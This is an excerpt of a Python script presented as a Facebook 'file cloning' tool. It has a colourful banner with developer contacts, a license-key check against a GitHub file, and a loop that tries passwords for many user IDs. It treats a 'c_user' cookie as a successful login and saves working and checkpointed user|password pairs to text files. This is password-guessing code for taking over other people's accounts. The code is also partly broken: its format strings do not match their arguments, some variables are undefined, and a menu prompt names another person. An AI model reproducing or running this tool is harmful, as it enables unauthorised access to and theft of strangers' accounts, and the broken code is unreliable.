...
colouroff="\x1b[00m"
logo=""" 
\x1b[38;5;46m  AAA   NN   NN IIIII  SSSSS   OOOOO  
 AAAAA  NNN  NN  III  SS      OO   OO 
AA   AA NN N NN  III   SSSSS  OO   OO 
AAAAAAA NN  NNN  III       SS OO   OO 
AA   AA NN   NN IIIII  SSSSS   OOOO0  

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            ANIS Schiaparelli 
     \033[1;91m➣ \033[1;91mFACEBOOK   :            ANIS Schiaparelli 
     \033[1;92m➣ \033[1;92mWHATSAPP   :            213669491481
     \033[1;91m➣ \033[1;91mGITHUB     :            PIKSO404 
     \033[1;92m➣ \033[1;92mTOOLS      :            FILE CLONING
     \033[1;31m➣ \033[1;31mVERSION    :            0.2
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
"""
...
a=requests.get("https://github.com/PIKSO404/Test2/blob/main/Update.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mANIS Schiaparelli_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mANIS Schiaparelli_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back MAHADI HASAN RAKIB Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[Schiaparelli-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Schiaparelli-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Schiaparelli_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Schiaparelli-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Schiaparelli_CP.txt' , 'a').write('%s\n' % wrt)
                        break
